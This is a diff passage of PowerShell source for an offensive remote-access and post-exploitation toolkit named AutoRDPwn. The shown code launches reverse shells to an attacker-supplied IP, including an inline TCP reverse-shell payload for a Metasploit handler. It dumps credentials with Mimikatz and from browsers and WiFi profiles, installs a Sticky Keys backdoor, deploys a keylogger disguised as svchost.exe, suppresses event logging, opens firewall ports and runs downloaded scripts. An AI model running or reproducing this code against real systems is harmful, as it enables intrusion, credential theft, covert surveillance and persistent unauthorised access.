+    if ([string]::IsNullOrWhiteSpace($ip)) {
+        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
+        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
+    }
+    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
+    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
+    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
+    Write-Host ('Netcat reverse connection --> ') -NoNewline -ForegroundColor Green
+    Write-Host ('nc -l ' + $port) -ForegroundColor Blue
+    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
+    if (Test-ARIsLocalTarget) {
+        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
+            param($path, $address, $remotePort)
+            . $path
+            Start-Sleep -Seconds 5
+            Invoke-PowerShellTcp -Reverse -IPAddress $address -Port $remotePort
+        } -ArgumentList $scriptPath, $ip, ([int]$port) | Out-Null
+    }
+    else {
+        $session = Get-ARTargetSession
+        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
+        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
+        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
+        $script:ARRemoteTempDirs.Add($remoteDirectory)
+        Invoke-Command -Session $session -ArgumentList $remoteScript, $ip, ([int]$port) -ScriptBlock {
+            param($path, $address, $remotePort)
+            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
+                param($script, $remoteAddress, $targetPort)
+                . $script
+                Start-Sleep -Seconds 5
+                Invoke-PowerShellTcp -Reverse -IPAddress $remoteAddress -Port $targetPort
+            } -ArgumentList $path, $address, $remotePort | Out-Null
+        } -ErrorAction Stop | Out-Null
+    }
+    Write-ARInfo 'The target will connect back in about 5 seconds. Keep the listener ready.'
+    Set-ARStatus 'Reverse connection scheduled' 'Ok'
+}
+
+function Invoke-ARModuleMimikatzSam {
+    Write-ARInfo 'Extracting credentials with Mimikatz (SAM)...'
+    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate lsadump::sam exit' }
+    Show-ARText $result
+    Set-ARStatus 'SAM dump finished' 'Ok'
+}
+
+function Invoke-ARModuleMimikatzLogon {
+    Write-ARInfo 'Extracting credentials with Mimikatz (logon passwords)...'
+    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate sekurlsa::logonPasswords exit' }
+    Show-ARText $result
+    Set-ARStatus 'Logon password dump finished' 'Ok'
+}
+
+function Invoke-ARModuleSharpWeb {
+    Import-ARToolScript 'Resources\Scripts\Invoke-SharpWeb.ps1'
+    $executable = Join-Path $script:ARTools 'SharpWeb.exe'
+    if (-not (Test-Path -LiteralPath $executable)) { throw 'SharpWeb could not be extracted.' }
+    $result = Invoke-ARTargetBinary -LocalPath $executable -Arguments @('all')
+    Show-ARText $result
+    Set-ARStatus 'Browser password recovery finished' 'Ok'
+}
+
+function Invoke-ARModuleWifiKeys {
+    $result = Invoke-ARTargetCommand -ScriptBlock {
+        $directory = Join-Path $env:TEMP ('wifi_' + [guid]::NewGuid().ToString('N'))
+        New-Item -ItemType Directory -Path $directory -Force | Out-Null
+        try {
+            & netsh.exe wlan export profile folder="$directory" key=clear 2>&1> $null
+            $lines = New-Object System.Collections.Generic.List[string]
+            $profiles = Get-ChildItem -LiteralPath $directory -Filter '*.xml' -ErrorAction SilentlyContinue
+            foreach ($profile in $profiles) {
+                try {
+                    [xml]$xml = Get-Content -LiteralPath $profile.FullName -Raw
+                    $name = [string]$xml.WLANProfile.name
+                    $key = [string]$xml.WLANProfile.MSM.security.sharedKey.keyMaterial
+                    if ($name -ne '') { $lines.Add(('SSID: ' + $name + '  Key: ' + $key)) }
+                } catch { }
+            }
+            if ($lines.Count -eq 0) { return 'There is no wireless network on this computer' }
+            return ($lines -join "`n")
+        }
+        finally { Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+    Show-ARText $result
+    Set-ARStatus 'WiFi keys recovered' 'Ok'
+}
+
+function Invoke-ARModulePortScan {
+    $target = Get-ARTargetComputer
+    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range') $target
+    $speed = Read-ARValue (Get-ARText 'txt56' 'Enter the scanning speed (1-5)') '3'
+    $ports = Read-ARValue (Get-ARText 'txt57' 'Enter the number of ports to scan (25-1000)') '100'
+    if ($speed -notmatch '^[1-5]$') { $speed = '3' }
+    if ($ports -notmatch '^\d+$') { $ports = '100' }
+    $threads = @{ '1' = 10; '2' = 25; '3' = 50; '4' = 100; '5' = 200 }[$speed]
+    $oldProgress = $ProgressPreference
+    $ProgressPreference = 'Continue'
+    try {
+        Import-ARFunctionScript 'Resources\Scripts\Invoke-Portscan.ps1'
+        Invoke-Portscan -Hosts $range -Threads $threads -TopPorts $ports
+    }
+    finally { $ProgressPreference = $oldProgress }
+    Set-ARStatus 'Port scan finished' 'Ok'
+}
+
+function Invoke-ARModulePortForward {
+    $operation = Read-ARValue 'Operation (1 local add, 2 remote add, 3 show, 4 reset)' '3'
+    if (Test-ARIsLocalTarget) {
+        $scriptBlock = {
+            param($action, $lport, $lhost, $rport, $rhost)
+            switch ($action) {
+                'add' { & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost" }
+                'show' { & netsh.exe interface portproxy show all }
+                'reset' { & netsh.exe interface portproxy reset }
+            }
+        }
+        if ($operation -eq '1' -or $operation -eq '2') {
+            $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
+            $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
+            $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
+            $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
+            & $scriptBlock 'add' $lport $lhost $rport $rhost
+        }
+        elseif ($operation -eq '4') { & $scriptBlock 'reset' }
+        else { & $scriptBlock 'show' }
+        Set-ARStatus 'Port forwarding updated' 'Ok'
+        return
+    }
+    if ($operation -eq '1') {
+        $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
+        $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
+        $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
+        $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
+        & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
+        Set-ARStatus 'Local port forwarding created' 'Ok'
+        return
+    }
+    $parameters = @{}
+    if ($operation -eq '2') {
+        $parameters['lport'] = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
+        $parameters['lhost'] = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
+        $parameters['rport'] = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
+        $parameters['rhost'] = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
+        Invoke-ARTargetCommand -ScriptBlock {
+            param($lport, $lhost, $rport, $rhost)
+            & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
+        } -ArgumentList @($parameters['lport'], $parameters['lhost'], $parameters['rport'], $parameters['rhost']) | ForEach-Object { Write-Host $_ }
+        Set-ARStatus 'Remote port forwarding created' 'Ok'
+    }
+    elseif ($operation -eq '4') {
+        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy reset } | ForEach-Object { Write-Host $_ }
+        Set-ARStatus 'Remote port forwarding reset' 'Ok'
+    }
+    else {
+        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy show all } | ForEach-Object { Write-Host $_ }
+        Set-ARStatus 'Remote port forwarding listed' 'Ok'
+    }
+}
+
+function Invoke-ARModuleWebServer {
+    $target = Get-ARTargetComputer
+    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Start-WebServer.ps1'
+    if (Test-ARIsLocalTarget) {
+        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
+            param($path)
+            . $path
+            Start-WebServer -BINDING 'http://+:8080/'
+        } -ArgumentList $scriptPath | Out-Null
+    }
+    else {
+        $session = Get-ARTargetSession
+        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnWeb_' + [guid]::NewGuid().ToString('N')
+        $remoteScript = Join-Path $remoteDirectory 'Start-WebServer.ps1'
+        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
+        $script:ARRemoteTempDirs.Add($remoteDirectory)
+        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
+            param($path)
+            netsh advfirewall firewall delete rule name="Powershell Web Server" 2>&1> $null
+            netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=allow protocol=TCP localport=8080 2>&1> $null
+            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
+                param($script)
+                . $script
+                Start-WebServer -BINDING 'http://+:8080/'
+            } -ArgumentList $path | Out-Null
+        } -ErrorAction Stop | Out-Null
+    }
+    $url = 'http://' + $target + ':8080/'
+    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
+    Write-Host 'Powershell Web Server --> ' -NoNewline -ForegroundColor Green
+    Write-Host $url -ForegroundColor Blue
+    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
+    try { Start-Process $url | Out-Null } catch { }
+    Set-ARStatus 'Web server started' 'Ok'
+}
+
+function Invoke-ARModuleCredScan {
+    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range')
+    $user = Read-ARValue (Get-ARText 'txt78' 'Enter the username')
+    $method = Read-ARValue (Get-ARText 'txt83' 'Select the verification method (Hash / Password)') 'hash'
+    $method = $method.ToLowerInvariant()
+    if ($method -like 'pass*' -or $method -like 'contra*') {
+        $plain = Read-ARSecret 'Password'
+        Import-ARFunctionScript 'Resources\Scripts\Get-NTLM.ps1'
+        $hash = Get-NTLM $plain
+    }
+    else {
+        $hash = Read-ARValue (Get-ARText 'txt84' 'Enter the NTLM Hash')
+    }
+    $protocol = Read-ARValue (Get-ARText 'txt85' 'Enter the protocol you want to use (SMB / WMI)') 'SMB'
+    Import-ARFunctionScript 'Resources\Scripts\Check-LocalAdminHash.ps1'
+    Check-LocalAdminHash -Username $user -PasswordHash $hash -CIDR $range -Protocol $protocol -Threads 20
+    Set-ARStatus 'Credential scan finished' 'Ok'
+}
+
+function Invoke-ARModuleRdpCaching {
+    if (-not (Test-ARIsLocalTarget)) { throw 'RDP-Caching only reads the local image cache.' }
+    Write-ARWarn (Get-ARText 'txt19' 'This process can take several minutes..')
+    $null = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\RDP-Caching.ps1'
+    $recovered = Join-Path $env:TEMP 'Recovered_RDP_Session'
+    if (-not (Test-Path -LiteralPath $recovered)) { throw 'No cached RDP images were recovered.' }
+    Write-ARSuccess ('Recovered images: ' + $recovered)
+    try { Start-Process explorer.exe -ArgumentList $recovered | Out-Null } catch { }
+    if (-not $script:ARInvokedFromOption) {
+        $null = Read-ARLineValue ' Press Enter to delete the recovered folder: '
+        Remove-Item -LiteralPath $recovered -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    Set-ARStatus 'RDP cache rebuilt' 'Ok'
+}
+
+function Invoke-ARModuleListUsers {
+    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\ListAllUsers.ps1' -Function 'ListAllUsers'
+    Show-ARText $result
+    Set-ARStatus 'User enumeration finished' 'Ok'
+}
+
+function Invoke-ARModuleSessionGopher {
+    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\SessionGopher.ps1' -Function 'Invoke-SessionGopher' -Arguments @{ Thorough = $true }
+    Show-ARText $result
+    Set-ARStatus 'SessionGopher finished' 'Ok'
+}
+
+function Invoke-ARModuleStickyKeys {
+    Write-ARInfo (Get-ARText 'txt34' 'Modifying permissions to enter without credentials..')
+    Invoke-ARTargetCommand -ScriptBlock {
+        $keys = @('sethc.exe', 'Utilman.exe')
+        foreach ($key in $keys) {
+            $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' + $key
+            New-Item -Path $path -Force | Out-Null
+            New-ItemProperty -Path $path -Name 'Debugger' -Value 'powershell.exe -noexit ; clear' -PropertyType String -Force | Out-Null
+        }
+        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'LogonTimeout' -Value 3600 -PropertyType DWORD -Force | Out-Null
+        Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
+        Enable-NetFirewallRule -Name 'RemoteDesktop-UserMode-In-TCP' -ErrorAction SilentlyContinue
+    } | Out-Null
+    Write-ARSuccess 'Sticky Keys backdoor installed. Trigger it from the logon screen.'
+    Set-ARStatus 'Sticky Keys backdoor installed' 'Ok'
+}
+
+function Invoke-ARModuleMetasploit {
+    $msfHost = Read-ARValue (Get-ARText 'txt65' 'Enter the IP where MSF is running')
+    $msfPort = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '4444'
+    $template = @'
+$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
+'@
+    $payload = $template -f $msfHost, $msfPort
+    if (Test-ARIsLocalTarget) {
+        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($code) Invoke-Expression $code } -ArgumentList $payload | Out-Null
+    }
+    else {
+        $session = Get-ARTargetSession
+        Invoke-Command -Session $session -ArgumentList $payload -ScriptBlock {
+            param($code)
+            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($command) Invoke-Expression $command } -ArgumentList $code | Out-Null
+        } -ErrorAction Stop | Out-Null
+    }
+    Write-ARWarn (Get-ARText 'txt63' 'Paste in your Metasploit Framework Console:')
+    Write-Host 'use exploit/multi/handler'
+    Write-Host 'set payload windows/shell/reverse_tcp'
+    Write-Host ('set LHOST ' + $msfHost)
+    Write-Host ('set LPORT ' + $msfPort)
+    Write-Host 'exploit'
+    Set-ARStatus 'Metasploit payload started' 'Ok'
+}
+
+function Invoke-ARModuleKeylogger {
+    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-Keylogger.ps1'
+    Push-Location $script:ARTools
+    try { . $scriptPath; $first = $Content1; $second = $Content2 } finally { Pop-Location }
+    if (-not $first -or -not $second) { throw 'The keylogger payload could not be loaded.' }
+    $work = New-ARWorkDirectory
+    $localDll = Join-Path $work 'dllhost.exe'
+    $localHost = Join-Path $work 'svchost.exe'
+    [System.IO.File]::WriteAllBytes($localDll, $first)
+    [System.IO.File]::WriteAllBytes($localHost, $second)
+    if (Test-ARIsLocalTarget) {
+        $dll = $localDll
+        $hostProcess = $localHost
+        Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
+        $logPath = Join-Path $env:LOCALAPPDATA 'config.dat'
+        Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue
+        Push-Location $work
+        try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
+        Start-Sleep -Milliseconds 500
+        if (-not (Test-Path -LiteralPath $logPath)) { New-Item -ItemType File -Path $logPath -Force | Out-Null }
+        Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
+        try { Get-Content -LiteralPath $logPath -Wait } finally { Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue }
+    }
+    else {
+        $session = Get-ARTargetSession
+        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnKey_' + [guid]::NewGuid().ToString('N')
+        $remoteDll = Join-Path $remoteDirectory 'dllhost.exe'
+        $remoteHost = Join-Path $remoteDirectory 'svchost.exe'
+        Copy-ARFileToTarget -LocalPath $localDll -RemotePath $remoteDll | Out-Null
+        Copy-ARFileToTarget -LocalPath $localHost -RemotePath $remoteHost | Out-Null
+        $script:ARRemoteTempDirs.Add($remoteDirectory)
+        $logPath = Invoke-Command -Session $session -ArgumentList $remoteDll, $remoteHost -ScriptBlock {
+            param($dll, $hostProcess)
+            Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
+            $log = Join-Path $env:LOCALAPPDATA 'config.dat'
+            Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
+            Push-Location (Split-Path -Parent $dll)
+            try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
+            Start-Sleep -Milliseconds 500
+            if (-not (Test-Path -LiteralPath $log)) { New-Item -ItemType File -Path $log -Force | Out-Null }
+            return $log
+        } -ErrorAction Stop
+        Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
+        try {
+            Invoke-Command -Session $session -ArgumentList $logPath -ScriptBlock {
+                param($path)
+                Get-Content -LiteralPath $path -Wait
+            } | ForEach-Object { Write-Host $_ }
+        }
+        finally {
+            try {
+                Invoke-Command -Session $session -ArgumentList $remoteHost -ScriptBlock {
+                    param($hostProcess)
+                    Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
+                } -ErrorAction SilentlyContinue | Out-Null
+            } catch { }
+        }
+    }
+    Set-ARStatus 'Keylogger stopped' 'Ok'
+}
+
+function Invoke-ARModuleChachi {
+    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Chachi-Enumerator.ps1' -Function 'Comprueba-Todo'
+    Show-ARText $result
+    Set-ARStatus 'Enumeration finished' 'Ok'
+}
+
+function Invoke-ARModuleSherlock {
+    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Sherlock.ps1' -Function 'Find-AllVulns'
+    Show-ARText $result
+    Set-ARStatus 'Sherlock finished' 'Ok'
+}
+
+function Invoke-ARModulePrivescCheck {
+    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-PrivescCheck.ps1' -Function 'Invoke-PrivescCheck'
+    Show-ARText $result
+    Set-ARStatus 'Privilege escalation audit finished' 'Ok'
+}
+
+function Invoke-ARModulePhant0m {
+    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Phant0m.ps1' -Function 'Invoke-Phant0m'
+    Show-ARText $result
+    Set-ARStatus 'Event log threads stopped' 'Ok'
+}
+
+function Invoke-ARModuleVncServer {
+    $target = Get-ARTargetComputer
+    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCServer.ps1'
+    $encoded = Get-Content -LiteralPath $scriptPath -Raw
+    if (Test-ARIsLocalTarget) {
+        $array = $encoded.ToCharArray()
+        [array]::Reverse($array)
+        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($array -join '')))
+        Invoke-Expression $decoded | Out-Null
+        Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn
+    }
+    else {
+        $session = Get-ARTargetSession
+        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnVnc_' + [guid]::NewGuid().ToString('N')
+        $remoteScript = Join-Path $remoteDirectory 'Invoke-VNCServer.ps1'
+        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
+        $script:ARRemoteTempDirs.Add($remoteDirectory)
+        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
+            param($path)
+            $payload = Get-Content -LiteralPath $path -Raw
+            $array = $payload.ToCharArray()
+            [array]::Reverse($array)
+            $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($array -join '')))
+            Invoke-Expression $decoded | Out-Null
+            netsh advfirewall firewall delete rule name="AutoRDPwn VNC" 2>&1> $null
+            netsh advfirewall firewall add rule name="AutoRDPwn VNC" dir=in action=allow protocol=TCP localport=5900 2>&1> $null
+            Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn
+        } -ErrorAction Stop | Out-Null
+    }
+    Import-ARToolScript 'Resources\Scripts\Invoke-VNCViewer.ps1'
+    $viewer = Join-Path $script:ARTools 'VNCViewer.exe'
+    if (-not (Test-Path -LiteralPath $viewer)) { throw 'VNCViewer could not be extracted.' }
+    $arguments = @('/password', 'AutoRDPwn', $target, '-disablesponsor', '-nostatus', '-notoolbar', '-autoscaling', '-nocursor')
+    if ([string]$script:ARTarget['Mode'] -eq 'view') { $arguments += '/viewonly' }
+    Start-Process -FilePath $viewer -ArgumentList $arguments | Out-Null
+    Set-ARStatus 'VNC server started' 'Ok'
+}
+
+function Invoke-ARModuleExternalScript {
+    $source = Read-ARValue (Get-ARText 'txt73' 'Enter the path or url of the script')
+    $function = Read-ARLineValue (' ' + (Get-ARText 'txt74' 'Write the function you want to execute') + ' [none]: ')
+    if ($null -eq $function) { $function = '' } else { $function = $function.Trim() }
+    if ($source -match '^https?://') {
+        $work = New-ARWorkDirectory
+        $localScript = Join-Path $work 'external.ps1'
+        Invoke-ARDownload -Url $source -OutFile $localScript
+    }
+    elseif (Test-Path -LiteralPath $source) {
+        $localScript = (Resolve-Path -LiteralPath $source).Path
+    }
+    else { throw 'The external script could not be found.' }
+    if (Test-ARIsLocalTarget) {
+        $result = & {
+            param($path, $functionName)
+            . $path
+            if ($functionName -ne '') { Invoke-Expression $functionName }
+        } $localScript $function
+        Show-ARText $result
+    }
+    else {
+        $session = Get-ARTargetSession
+        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnScript_' + [guid]::NewGuid().ToString('N')
+        $remoteScript = Join-Path $remoteDirectory 'external.ps1'
+        Copy-ARFileToTarget -LocalPath $localScript -RemotePath $remoteScript | Out-Null
+        $script:ARRemoteTempDirs.Add($remoteDirectory)
+        $result = Invoke-Command -Session $session -ArgumentList $remoteScript, $function -ScriptBlock {
+            param($path, $functionName)
+            Push-Location (Split-Path -Parent $path)
+            try {
+                . $path
+                if ($functionName -ne '') { Invoke-Expression $functionName }
+            }
+            finally { Pop-Location }
+        } -ErrorAction Stop
+        Show-ARText $result
+    }
+    Set-ARStatus 'External script executed' 'Ok'
+}
+
+function Invoke-ARModuleRunAs {
+    if (-not (Test-ARIsLocalTarget)) { throw 'RunAs only works on the local computer.' }
+    $user = Read-ARValue (Get-ARText 'txt78' 'Enter the username')
+    $plain = Read-ARSecret 'Password'
+    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+    $context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:COMPUTERNAME)
+    if (-not $context.ValidateCredentials($user, $plain)) {
+        throw (Get-ARText 'txt81' 'Wrong credentials! Returning to the main menu..')
+    }
+    Import-ARToolScript 'Resources\Scripts\Invoke-RunAs.ps1'
+    $executable = Join-Path $script:ARTools 'RunAs.exe'
+    if (-not (Test-Path -LiteralPath $executable)) { throw 'RunAs could not be extracted.' }
+    & $executable -u $user -p $plain -e 'powershell.exe -NoExit'
+    Set-ARStatus 'Process launched as the new user' 'Ok'
+}
+
+function Show-ARLineLanguagePicker {
+    $languages = @('English', 'Spanish', 'French', 'German', 'Italian', 'Russian', 'Portuguese')
+    Write-Host ''
+    for ($index = 0; $index -lt $languages.Count; $index++) {
+        Write-Host (' {0}. {1}' -f ($index + 1), $languages[$index]) -ForegroundColor Gray
+    }
+    $defaultIndex = [Array]::IndexOf($languages, $script:ARLocaleName)
+    if ($defaultIndex -lt 0) { $defaultIndex = 0 }
+    $choice = Read-ARValue 'Language (1-7)' ([string]($defaultIndex + 1))
+    $name = Resolve-ARLanguageName $choice
+    Initialize-ARLanguage $name
+    Set-ARStatus ('Language: ' + $name) 'Ok'
+}
+
+function Start-ARApplication {
+    Initialize-ARLanguage $script:ARLanguageArgument
+    if ($script:ARShadowPreference -in @('see', 'view', 'ver', 'regarder', 'siehe', 'vedere')) {
+        $script:ARTarget['Mode'] = 'view'
+    }
+    elseif ($script:ARShadowPreference -in @('control', 'controlar', 'controle', 'kontrolle', 'controllo')) {
+        $script:ARTarget['Mode'] = 'control'
+    }
+    Initialize-ARDefender
+    Set-ARStatus 'Ready' 'Info'
+
+    if ($script:ARInvokedFromOption) {
+        $selection = Resolve-ARSelection $script:AROptionValue
+        if ($selection -like 'ACTION:*') {
+            Invoke-ARAction $selection.Substring(7)
+            return
+        }
+        throw ('Unknown option: ' + $script:AROptionValue)
+    }
+
+    while ($true) {
+        if ($script:ARNoGui -or [Console]::IsInputRedirected) {
+            $selection = Show-ARLineMenu
+            if ([string]::IsNullOrWhiteSpace($selection) -or $selection -eq 'QUIT') { break }
+            if ($selection -eq 'TARGET') { Show-ARLineTargetForm; continue }
+            if ($selection -eq 'LANGUAGE') { Show-ARLineLanguagePicker; continue }
+            if ($selection -like 'ACTION:*') { Invoke-ARAction $selection.Substring(7); continue }
+            Set-ARStatus (Get-ARText 'txt6' 'Incorrect option, try again') 'Warn'
+            continue
+        }
+        $selection = Show-ARTui
+        if ([string]::IsNullOrWhiteSpace($selection) -or $selection -eq 'QUIT') { break }
+        if ($selection -eq 'TARGET') { continue }
+        if ($selection -eq 'LANGUAGE') {
+            $language = Show-ARLanguagePicker
+            if ($language -ne '') { Initialize-ARLanguage $language }
+            continue
+        }
+        if ($selection -like 'ACTION:*') { Invoke-ARAction $selection.Substring(7); continue }
+    }
+}
+
+try {
+    Start-ARApplication
+}
+catch {
+    Write-ARError $_.Exception.Message
+}
+finally {
+    Invoke-ARCleanup
+}
